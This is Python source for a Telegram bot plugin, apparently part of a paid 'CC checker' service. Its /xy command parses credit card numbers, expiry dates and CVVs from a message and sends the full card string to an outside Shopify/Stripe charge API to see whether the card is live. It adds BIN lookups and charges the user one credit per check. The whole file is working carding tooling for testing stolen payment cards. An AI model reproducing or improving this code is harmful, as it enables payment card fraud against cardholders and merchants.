from pyrogram import Client, filters
import requests
from urllib.parse import quote_plus
import json
import re
import time
from plugins.func.users_sql import *
from datetime import date
import requests
import json
session = requests.session()


@Client.on_message(filters.command('xy'))
async def cmd_au(Client, message):
    try:
        # NES TOOLS
        user_id = str(message.from_user.id)
        chat_type = str(message.chat.type)
        chat_id = str(message.chat.id)
        # PLAN CHECK

        regdata = fetchinfo(user_id)
        results = str(regdata)
        if results == 'None':
            resp = "You Are Not Registered ⚠️. First Register By Using /register To Use Me!"
            await message.reply_text(resp, message.id)
        else:
            # HERE
            # PM AND AUTH CHECK
            pm = fetchinfo(user_id)
            status = pm[2]
            role = status
            # CREDIT CHECK
            chk_credit = fetchinfo(user_id)
            credit = int(chk_credit[5])
            if credit < 1:
                resp = "You Have Insufficient Credit To Use Me. Recharge Credit Using /buy Or Wait For Free Credit Using GiftCard .!"
                await message.reply_text(resp, message.id)
            else:
                # ANTISPAM MODULE
                user_id = str(message.from_user.id)
                results = fetchinfo(user_id)
                status = results[2]
                antispam_time = int(results[7])
                now = int(time.time())
                count_antispam = now - antispam_time
                if status == 'FREE' and count_antispam < 40:
                    after = 40 - count_antispam
                    resp = f"""
#ANTI_SPAM ⚠️
Try After {after}s Or purchase /buy to reduce it!
            """
                    await message.reply_text(resp, message.id)
                elif status == 'PREMIUM' and count_antispam < 20:
                    after = 20 - count_antispam
                    resp = f"""
#ANTI_SPAM ⚠️
Retry After {after}s
            """
                    await message.reply_text(resp, message.id)

                else:
                    if message.reply_to_message:
                        cc = message.reply_to_message.text
                    else:
                        cc = message.text[len('/xy '):]
                    if len(cc) == 0:
                        nocc = """No CCS Found. ⚠️"""
                        return await message.reply_text(nocc, message.id)
                    cards = []
                    x = cc
                    input = re.findall(r"[0-9]+", x)
                    if not input or len(input) < 3:
                        nocc = """No CCS Found. ⚠️"""
                        return await message.reply_text(nocc, message.id)
                    if len(input) == 3:
                        cc = input[0]
                        if len(input[1]) == 3:
                            mes = input[2][:2]
                            ano = input[2][2:]
                            cvv = input[1]
                        else:
                            mes = input[1][:2]
                            ano = input[1][2:]
                            cvv = input[2]
                    else:
                        cc = input[0]
                        if len(input[1]) == 3:
                            mes = input[2]
                            ano = input[3]
                            cvv = input[1]
                        else:
                            mes = input[1]
                            ano = input[2]
                            cvv = input[3]
                        if len(mes) == 2 and (mes > '12' or mes < '01'):
                            ano1 = mes
                            mes = ano
                            ano = ano1

                        if (cc, mes, ano, cvv):
                            cards.append([cc, mes, ano, cvv])
                        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
                        firstresp = f"""
<b> STRIPE CHARGE $35  
━━━━━━━━━
 Card - <code>{fullcc}</code> 
 Status - Processing...
 Response - □□□□□
</b>
              """

                        firstchk = await message.reply_text(firstresp, message.id)
                        secondresp = f"""
<b> STRIPE CHARGE $35  
━━━━━━━━━
 Card - <code>{fullcc}</code> 
 Status - Processing...
 Response - ■□□□□
</b>
              """
                        time.sleep(1)
                        secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp)
                        thirdresp = f"""
<b> STRIPE CHARGE $35   
━━━━━━━━━
 Card - <code>{fullcc}</code> 
 Status - Processing...
 Response - ■■□□□
</b>
              """
                        thirdchk = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp)
                        # STARTED CHECKING CC#
                        tic = time.perf_counter()
                        authurl = f"https://rembelapi.omx.pw/api/shopify.php?lista={fullcc}"
                        reqone = session.get(authurl)
                        result = reqone.text
                        fourthresp = f"""
<b> STRIPE CHARGE $35   
━━━━━━━━━
 Card - <code>{fullcc}</code> 
 Status - Processing...
 Response - ■■■□□
</b>
              """
                        fourthchk = await Client.edit_message_text(message.chat.id, thirdchk.id, fourthresp)
                        # BIN RESPINSE
                        fbin = cc[:6]

                        bin = session.get(
                            f"https://lookup.binlist.net/{fbin}").json()
                        try:
                            brand = bin["scheme"].upper()
                        except:
                            brand = "N/A"
                        try:
                            type = bin["type"].upper()
                        except:
                            type = "N/A"
                        try:
                            level = bin["brand"].upper()
                        except:
                            level = "N/A"
                        try:
                            bank_data = bin["bank"]
                        except:
                            bank_data = "N/A"
                        try:
                            bank = bank_data["name"].upper()
                        except:
                            bank = "N/A"
                        try:
                            country_data = bin["country"]
                        except:
                            country_data = "N/A"
                        try:
                            country = country_data["name"].upper()
                        except:
                            country = "N/A"
                        try:
                            flag = country_data["emoji"]
                        except:
                            flag = "N/A"
                        try:
                            currency = country_data["currency"].upper()
                        except:
                            currency = "N/A"
                        toc = time.perf_counter()
                        # RESPONSE SECTION
                        fifthresp = f"""
<b> STRIPE CHARGE $35  
━━━━━━━━━
 Card - <code>{fullcc}</code> 
 Status - Processing...
 Response - ■■■■□
</b>
              """
                        fifthchk = await Client.edit_message_text(message.chat.id, fourthchk.id, fifthresp)
                        sixresp = f"""
<b> STRIPE CHARGE $35   
━━━━━━━━━
 Card - <code>{fullcc}</code> 
 Status - Processing...
 Response - ■■■■■
</b>
              """
                        sixchk = await Client.edit_message_text(message.chat.id, fifthchk.id, sixresp)
                    # --------------FINAL RESPONSE ------------#

                        finalresp = f"""
<b>STRIPE CHARGE $35 
┏－－－－－－－－－－－－－－－－－－┒</b>
┠ Card - <code>{fullcc}</code> 
{result}
┠－－－－－－－－－－－－－－－－
┠ BIN INFO
┠ Bin - {fbin} - {brand} - {type} - {level}
┠ Bank - {bank} 🏛  
┠ Country - {country} - {flag} - {currency}
┠－－－－－－－－－－－－－－－－
┠ CHECK INFO
┠ Time in Progress - {toc - tic:0.4f}sec
┠ Credit Deducted - 1
┠ Checked by: <a href="tg://user?id={message.from_user.id}"> {message.from_user.first_name}</a> | [ {role} ]
┠ 𝘋𝘦𝘝 - <a href="tg://user?id=1418571871">̠K̠̠E̠̠V̠̠I̠̠N̠ ̠X̠  ⚠️</a>
┗－－－－－－－－－－－－－－－－－┛</b>
            """

                        finalchk = await Client.edit_message_text(message.chat.id, sixchk.id, finalresp)
                        # ANTISPAM TIME SET
                        module_name = "antispam_time"
                        value = int(time.time())
                        updatedata(user_id, module_name, value)

                        fetch = fetchinfo(user_id)
                        credit = int(fetch[5])
                        module_name = "credit"
                        deduct = credit - 1
                        value = deduct
                        updatedata(user_id, module_name, value)
                        await plan_expirychk(user_id)
    except Exception as e:
        print(e)
